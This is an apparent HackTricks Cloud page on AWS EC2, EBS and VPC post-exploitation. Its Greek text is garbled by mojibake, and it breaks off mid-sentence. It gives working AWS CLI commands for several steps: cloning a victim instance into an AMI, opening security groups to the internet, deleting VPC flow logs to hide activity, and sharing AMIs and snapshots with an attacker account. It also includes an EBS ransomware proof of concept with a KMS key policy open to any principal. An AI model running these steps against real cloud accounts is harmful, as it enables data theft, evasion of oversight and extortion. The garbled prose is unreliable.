# AWS - EC2, EBS, SSM & VPC Post Exploitation

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î“Î¯Î½ÎµÏ„Îµ Î¼Î­Î»Î¿Ï‚ Ï„Î·Ï‚** ğŸ’¬ [**Î¿Î¼Î¬Î´Î±Ï‚ Discord**](https://discord.gg/hRep4RUj7f) Î® Ï„Î·Ï‚ [**Î¿Î¼Î¬Î´Î±Ï‚ telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± github.

</details>
{% endhint %}

## EC2 & VPC

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

Î— Î±Î½Ï„Î±Î½Î¬ÎºÎ»Î±ÏƒÎ· ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î±Ï‚ VPC **Î´Î¹Ï€Î»Î±ÏƒÎ¹Î¬Î¶ÎµÎ¹ Ï„Î·Î½ ÎµÎ¹ÏƒÎµÏÏ‡ÏŒÎ¼ÎµÎ½Î· ÎºÎ±Î¹ ÎµÎ¾ÎµÏÏ‡ÏŒÎ¼ÎµÎ½Î· ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î± Î³Î¹Î± EC2 instances Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± VPC** Ï‡Ï‰ÏÎ¯Ï‚ Ï„Î·Î½ Î±Î½Î¬Î³ÎºÎ· ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚ Î¿Ï„Î¹Î´Î®Ï€Î¿Ï„Îµ ÏƒÏ„Î± Î¯Î´Î¹Î± Ï„Î± instances. Î‘Ï…Ï„Î® Î· Î´Î¹Ï€Î»Î±ÏƒÎ¹Î±ÏƒÎ¼Î­Î½Î· ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î± ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î±Ï€Î¿ÏƒÏ„Î­Î»Î»ÎµÏ„Î±Î¹ ÏƒÎµ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½ ÏƒÏÏƒÏ„Î·Î¼Î± Î±Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ·Ï‚ ÎµÎ¹ÏƒÎ²Î¿Î»ÏÎ½ Î´Î¹ÎºÏ„ÏÎ¿Ï… (IDS) Î³Î¹Î± Î±Î½Î¬Î»Ï…ÏƒÎ· ÎºÎ±Î¹ Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿ÏÎ¸Î·ÏƒÎ·.\
ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï„Î¿ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î±Ï…Ï„ÏŒ Î³Î¹Î± Î½Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÎ¹ ÏŒÎ»Î· Ï„Î·Î½ ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î± ÎºÎ±Î¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î±Ï€ÏŒ Î±Ï…Ï„Î®Î½:

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ»Î­Î³Î¾Ï„Îµ Î±Ï…Ï„Î® Ï„Î· ÏƒÎµÎ»Î¯Î´Î±:

{% content-ref url="aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### Î‘Î½Ï„Î¹Î³ÏÎ±Ï†Î® Î¤ÏÎ­Ï‡Î¿Î½Ï„Î¿Ï‚ Instance

Î¤Î± instances ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ ÎºÎ¬Ï€Î¿Î¹Î¿ ÎµÎ¯Î´Î¿Ï‚ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Ï‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½. Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î´Î¹Î¬Ï†Î¿ÏÎ¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Î¼Ï€ÎµÎ¯Ï„Îµ Î¼Î­ÏƒÎ± (ÎµÎ»Î­Î³Î¾Ï„Îµ [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc.md)). Î©ÏƒÏ„ÏŒÏƒÎ¿, Î­Î½Î±Ï‚ Î¬Î»Î»Î¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¹ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ ÎµÎ¯Î½Î±Î¹ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± AMI ÎºÎ±Î¹ Î½Î± Ï„ÏÎ­Î¾ÎµÏ„Îµ Î­Î½Î± Î½Î­Î¿ instance (Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ ÏƒÏ„Î¿Î½ Î´Î¹ÎºÏŒ ÏƒÎ±Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ) Î±Ï€ÏŒ Î±Ï…Ï„ÏŒ**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Î¤Î± Snapshots ÎµÎ¯Î½Î±Î¹ Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï„Ï‰Î½ volumes**, Ï„Î± Î¿Ï€Î¿Î¯Î± ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î¸Î± Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ **ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**, ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Î¿ Î­Î»ÎµÎ³Ï‡ÏŒÏ‚ Ï„Î¿Ï…Ï‚ Î¸Î± Î±Ï€Î¿ÎºÎ±Î»ÏÏˆÎµÎ¹ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.\
Î‘Î½ Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± **volume Ï‡Ï‰ÏÎ¯Ï‚ snapshot** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ: **ÎÎ± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± snapshot** ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î¹Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ Î® Î±Ï€Î»Î¬ **Î½Î± Ï„Î¿ Ï€ÏÎ¿ÏƒÎ±ÏÏ„Î®ÏƒÎµÏ„Îµ ÏƒÎµ Î¼Î¹Î± instance** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ:

{% content-ref url="aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### Data Exfiltration

#### DNS Exfiltration

Î‘ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î±Î½ ÎºÎ»ÎµÎ¹Î´ÏÏƒÎµÏ„Îµ Î­Î½Î± EC2 ÏÏƒÏ„Îµ Î½Î± Î¼Î·Î½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²Î³ÎµÎ¹ ÎºÎ±Î¼Î¯Î± ÎºÎ¯Î½Î·ÏƒÎ·, Î¼Ï€Î¿ÏÎµÎ¯ Î±ÎºÏŒÎ¼Î± **Î½Î± ÎµÎ¾Î¬Î³ÎµÎ¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î¼Î­ÏƒÏ‰ DNS**.

* **Î¤Î± VPC Flow Logs Î´ÎµÎ½ Î¸Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎ¿Ï…Î½ Î±Ï…Ï„ÏŒ**.
* Î”ÎµÎ½ Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î± AWS DNS logs.
*   Î‘Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Î±Ï…Ï„ÏŒ ÏÏ…Î¸Î¼Î¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿ "enableDnsSupport" ÏƒÎµ false Î¼Îµ:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration Î¼Î­ÏƒÏ‰ API calls

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ API endpoints ÎµÎ½ÏŒÏ‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î±Ï…Ï„ÏŒÎ½. Î¤Î¿ Cloudtrail Î¸Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÎ¹ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ ÎºÎ±Î¹ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´ÎµÎ¹ Ï„Î± ÎµÎ¾Î±Î³ÏŒÎ¼ÎµÎ½Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏƒÏ„Î± Cloudtrail logs.

### Open Security Group

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÎµÏÎ±Î¹Ï„Î­ÏÏ‰ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Î´Î¹ÎºÏ„ÏÎ¿Ï… Î±Î½Î¿Î¯Î³Î¿Î½Ï„Î±Ï‚ Î¸ÏÏÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Î±Ï…Ï„Î®:

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### Privesc to ECS

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Ï„ÏÎ­Î¾ÎµÏ„Îµ Î­Î½Î± EC2 instance ÎºÎ±Î¹ Î½Î± Ï„Î¿ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ®ÏƒÎµÏ„Îµ Î³Î¹Î± Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ECS instances ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± ÎºÎ»Î­ÏˆÎµÏ„Îµ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï„Ï‰Î½ ECS instances.

Î“Î¹Î± [**Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ»Î­Î³Î¾Ï„Îµ Î±Ï…Ï„ÏŒ**](../../aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs).

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### ÎšÎ¿Î¹Î½Î¿Ï€Î¿Î¯Î·ÏƒÎ· AMI

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### ÎšÎ¿Î¹Î½Î¿Ï€Î¿Î¯Î·ÏƒÎ· EBS Snapshot

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### EBS Ransomware PoC

ÎœÎ¹Î± Î±Ï€ÏŒÎ´ÎµÎ¹Î¾Î· Ï„Î·Ï‚ Î­Î½Î½Î¿Î¹Î±Ï‚ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î± Î¼Îµ Ï„Î·Î½ ÎµÏ€Î¯Î´ÎµÎ¹Î¾Î· Ransomware Ï€Î¿Ï… Ï€Î±ÏÎ¿Ï…ÏƒÎ¹Î¬ÏƒÏ„Î·ÎºÎµ ÏƒÏ„Î¹Ï‚ ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÎµÎ¹Ï‚ Î¼ÎµÏ„Î¬ Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Î¿Ï… S3. Î¤Î¿ KMS Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î¼ÎµÏ„Î¿Î½Î¿Î¼Î±ÏƒÏ„ÎµÎ¯ ÏƒÎµ RMS Î³Î¹Î± Ransomware Management Service Î¼Îµ Ï„Î¿ Ï€ÏŒÏƒÎ¿ ÎµÏÎºÎ¿Î»Î¿ ÎµÎ¯Î½Î±Î¹ Î½Î± Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î³Î¹Î± Ï„Î·Î½ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· Î´Î¹Î±Ï†ÏŒÏÏ‰Î½ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ AWS Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿.

Î ÏÏÏ„Î± Î±Ï€ÏŒ Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ AWS 'ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…', Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î­Î½Î± customer managed key ÏƒÏ„Î¿ KMS. Î“Î¹Î± Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î¸Î± Î±Ï†Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î·Î½ AWS Î½Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï„Î¿Ï… ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï Î³Î¹Î± Î¼Î­Î½Î±, Î±Î»Î»Î¬ ÏƒÎµ Î­Î½Î± ÏÎµÎ±Î»Î¹ÏƒÏ„Î¹ÎºÏŒ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Î­Î½Î±Ï‚ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿Ï‚ Ï€Î±ÏÎ¬Î³Î¿Î½Ï„Î±Ï‚ Î¸Î± Î´Î¹Î±Ï„Î·ÏÎ¿ÏÏƒÎµ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï„Î¿Ï… ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï ÎµÎºÏ„ÏŒÏ‚ Ï„Î¿Ï… ÎµÎ»Î­Î³Ï‡Î¿Ï… Ï„Î·Ï‚ AWS. Î‘Î»Î»Î¬Î¾Ï„Îµ Ï„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï Î³Î¹Î± Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÏ„Îµ ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ AWS account Principal Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯. Î“Î¹Î± Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï, Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Î®Ï„Î±Î½ 'AttackSim' ÎºÎ±Î¹ Î¿ ÎºÎ±Î½ÏŒÎ½Î±Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏŒÎ»Î· Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
ÎŸ ÎºÎ±Î½ÏŒÎ½Î±Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Ï„Î± Î±ÎºÏŒÎ»Î¿Ï…Î¸Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î± Î³Î¹Î± Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… Î³Î¹Î± ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· ÎµÎ½ÏŒÏ‚ EBS volume:

* `kms:CreateGrant`
* `kms:Decrypt`
* `kms:DescribeKey`
* `kms:GenerateDataKeyWithoutPlainText`
* `kms:ReEncrypt`

Î¤ÏÏÎ± Î¼Îµ Ï„Î¿ Î´Î·Î¼ÏŒÏƒÎ¹Î± Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Î³Î¹Î± Ï‡ÏÎ®ÏƒÎ·. ÎœÏ€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ 'victim' Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ EC2 instances Î¼Îµ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î± Î¼Î· ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î± EBS volumes. Î¤Î± EBS volumes Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï 'victim' ÎµÎ¯Î½Î±Î¹ Î±Ï…Ï„Î¬ Ï€Î¿Ï… ÏƒÏ„Î¿Ï‡ÎµÏÎ¿Ï…Î¼Îµ Î³Î¹Î± ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·, Î±Ï…Ï„Î® Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î³Î¯Î½ÎµÏ„Î±Î¹ Ï…Ï€ÏŒ Ï„Î·Î½ Ï…Ï€ÏŒÎ¸ÎµÏƒÎ· Ï€Î±ÏÎ±Î²Î¯Î±ÏƒÎ·Ï‚ ÎµÎ½ÏŒÏ‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï AWS Î¼Îµ Ï…ÏˆÎ·Î»Î¬ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Î Î±ÏÏŒÎ¼Î¿Î¹Î± Î¼Îµ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ransomware Ï„Î¿Ï… S3. Î‘Ï…Ï„Î® Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î¸Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î± Ï„Ï‰Î½ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Ï‰Î½ EBS volumes Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ snapshots, Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿ Î´Î·Î¼ÏŒÏƒÎ¹Î± Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Î±Ï€ÏŒ Ï„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ 'attacker' Î³Î¹Î± Î½Î± ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÎµÎ¹ Ï„Î± Î½Î­Î± EBS volumes, ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î¸Î± Î±Ï€Î¿ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹ Ï„Î± Î±ÏÏ‡Î¹ÎºÎ¬ EBS volumes Î±Ï€ÏŒ Ï„Î¹Ï‚ EC2 instances ÎºÎ±Î¹ Î¸Î± Ï„Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹, ÎºÎ±Î¹ Ï„Î­Î»Î¿Ï‚ Î¸Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î± snapshots Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎ±Î½ Î³Î¹Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Ï„Ï‰Î½ Î½Î­Ï‰Î½ 